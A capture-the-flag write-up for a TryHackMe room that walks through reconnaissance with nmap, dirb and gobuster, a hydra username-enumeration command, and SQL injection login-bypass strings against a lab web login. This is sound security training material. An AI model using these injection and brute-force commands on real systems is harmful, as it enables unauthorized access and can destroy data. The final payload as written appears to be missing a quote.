# Lesson Learned?
+ Link: https://tryhackme.com/r/room/lessonlearned
+ Type: Challenge

+ Target IP Address: 10.10.9.124

## Tools
+ NMAP
+ DIRB
+ Gobuster
+ OWASP ZAP
+ Burb Suite
+ Hydra

## External Resources
+ https://www.exploit-db.com/exploits/41694
+ https://www.stationx.net/owasp-zap-tutorial/
+ https://www.linkedin.com/pulse/lesson-learned-sqli-adam-natonik/
+ https://ctf101.org/web-exploitation/overview/
+ https://portswigger.net/burp/documentation/desktop/getting-started/intercepting-http-traffic
+ https://blog.noncenz.com/posts/lesson-learned/

## Task 1
1. Recon: `nmap -sV 10.10.9.124`. Saw that it had the services Apache and OpenSSH open.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room02/Screenshots/1.png)
  
2. Went to http://10.10.9.124 and inspected the source code. Saw that it uses the POST method.
3. `dirb http://10.10.9.124`. Didn't find anything useful as it mostly outputted manual pages.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room02/Screenshots/2.png)
  
4. Tried `gobuster dir -u http://10.10.9.124 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt` to see if the output would be different; there were no manual pages.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room02/Screenshots/3.png)
  
5. Used OWASP ZAP Automated Scan and found that the website was vulnerable to SQL injection.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room02/Screenshots/4.png)
  
6. Entered `ZAP' OR '1'='1' --`into the login page's usename field, but got a pop-ups stating that the table was lost.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room02/Screenshots/5.png)
  
7. Used Burp Suite to find the login page's query.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room02/Screenshots/6.png)
  
8. Used `hydra -L /usr/share/wordlists/SecLists/Usernames/Names/malenames-usa-top1000.txt -p qwe 10.10.9.124 http-post-form "/:username=^USER^&password=^PASS^:Invalid username and password."`
   to get possible usernames.
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room02/Screenshots/7.png)
  
9. Tried entering `arnold' AND 1=1 --`, `arnold' AND '1'='1' --`, `ARNOLD' AND 1=1`, and `ARNOLD' AND '1'='1'` into the login page's username field, but none would work.
10. Entered `arnold #` into the login page's username field and got the flag.

## Learned
+ New Tools: OWASP ZAP, Gobuster.
+ Hydra can be used to check for usernames too.
+ Injecting the SQL command `OR 1=1` is bad because it returns every row in the users table and can make it's way into a delete statement.
  Using `AND 1=1` and a valid input is best.